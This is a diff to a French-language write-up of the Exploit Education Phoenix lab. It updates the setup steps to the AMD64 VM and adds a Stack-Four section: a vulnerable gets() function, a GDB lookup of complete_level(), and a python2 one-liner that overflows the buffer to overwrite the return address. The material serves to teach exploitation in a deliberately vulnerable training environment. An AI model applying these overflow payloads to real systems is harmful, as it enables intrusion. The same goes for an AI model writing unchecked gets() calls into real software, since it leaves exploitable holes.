@@ -21,7 +21,9 @@ Ces compétences sont essentielles pour le reverse engineering et la recherche d
 
 ## Environnement de travail
 
-Après avoir téléchargé et installé la VM Phoenix (architecture ARM64), le répertoire de travail `/opt/phoenix/arm64/` contient plusieurs catégories d'exercices :
+Après avoir téléchargé et installé la VM Phoenix (architecture AMD64), lancer : `./boot-exploit-education-phoenix-amd64.sh`. Se connecter : `ssh user@0.0.0.0 -p 2222` .
+
+Le répertoire de travail `/opt/phoenix/amd64/` contient plusieurs catégories d'exercices :
 
 ```
 stack-zero     stack-one      stack-two      stack-three
@@ -185,6 +187,51 @@ python2 -c "print(64 * 'a' + '\xc4\x07\x40')" | ./stack-three
 ```
 
 **Résultat** : Le pointeur de fonction est redirigé vers `complete_level()`, qui s'exécute.
+
+
+---
+
+## Stack-Four : Détournement de l'adresse de retour
+
+### Objectif du challenge
+
+Faire exécuter la fonction `complete_level()` en modifiant l'adresse de retour de la fonction `start_level()` :
+
+```c
+void start_level() {
+  char buffer[64];
+  void *ret;
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+  printf("and will be returning to %p\n", ret);
+}
+```
+### Démarche de réflexion
+
+Pour réussir, je dois :
+1. Trouver l'adresse de `complete_level()` en mémoire
+2. Écraser l'adresse de retour dans le prologue de la fonction de `start_level()`
+
+Représentation de la mémoire :
+
+![](/images/phoenix/stack-four.png)
+### Analyse avec GDB
+
+On récupère l'adresse de comple_level()
+```bash
+(gdb) print complete_level
+$1 = {<text variable, no debug info>} 0x40061d <complete_level>
+``` 
+### Exploitation
+Il faut donc faire un overflow pour écraser la valeur intiale de l'adresse de retour.
+Avec la représentation de la stack, nous pouvons remarquer qu'il faut écire de `rbp - 0x50` jusqu'à `rbp + 0x8` et écrire l'adresse.
+Il faut donc écrire 0x58 puis l'adresse.
+
+Solution : 
+`python2 -c 'print(0x58 * b"a" + b"\x1d\x06\x40")' | ./stack-four`
+
 
 ## Conclusion et perspectives
 
